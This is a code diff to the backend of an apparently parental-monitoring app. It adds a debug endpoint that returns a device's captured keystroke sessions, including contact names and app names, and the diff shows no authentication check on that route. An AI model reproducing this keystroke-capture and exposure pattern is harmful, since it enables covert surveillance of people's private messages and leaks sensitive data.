@@ -1033,12 +1033,75 @@ function analyzeRisk(text) {
   return { riskLevel: 'LOW', flaggedKeywords: [], sentiment };
 }
 
+// DEBUG: Check keystroke status for device
+router.get('/keystrokes/debug/:deviceId', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    
+    // Find device
+    let device = null;
+    if (mongoose.Types.ObjectId.isValid(deviceId)) {
+      device = await Device.findById(deviceId);
+    }
+    if (!device) {
+      device = await Device.findOne({ deviceId: deviceId });
+    }
+    
+    if (!device) {
+      return res.json({
+        found: false,
+        searchedId: deviceId,
+        message: 'Device not found',
+        hint: 'The deviceId might be wrong or device needs to be re-paired'
+      });
+    }
+    
+    // Count keystroke sessions
+    const totalSessions = await KeystrokeSession.countDocuments({ deviceId: device.deviceId });
+    const sessions = await KeystrokeSession.find({ deviceId: device.deviceId })
+      .sort({ lastMessageTime: -1 })
+      .limit(5)
+      .select('sessionId appName contactName messageCount lastMessageTime riskLevel');
+    
+    res.json({
+      found: true,
+      device: {
+        mongoId: device._id.toString(),
+        androidId: device.deviceId,
+        name: device.name
+      },
+      keystrokeStats: {
+        totalSessions,
+        recentSessions: sessions.map(s => ({
+          sessionId: s.sessionId.substring(0, 8) + '...',
+          app: s.appName,
+          contact: s.contactName,
+          messages: s.messageCount,
+          lastTime: s.lastMessageTime,
+          risk: s.riskLevel
+        }))
+      },
+      hints: totalSessions === 0 ? [
+        'No keystrokes captured yet',
+        'Make sure Accessibility Service is enabled on child device',
+        'Open Settings > Accessibility > FamilyGuard and enable it',
+        'Type in any messaging app to test keystroke capture'
+      ] : []
+    });
+    
+  } catch (error) {
+    console.error('Keystroke debug error:', error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
 // POST: Sync keystrokes from device
 router.post('/keystrokes', async (req, res) => {
   try {
     const { deviceId, keystrokes } = req.body;
     
     if (!deviceId || !keystrokes || !Array.isArray(keystrokes)) {
+      console.log('[Sync] Invalid keystroke request:', { deviceId: !!deviceId, keystrokes: Array.isArray(keystrokes) });
       return res.status(400).json({ error: 'deviceId and keystrokes array required' });
     }
     
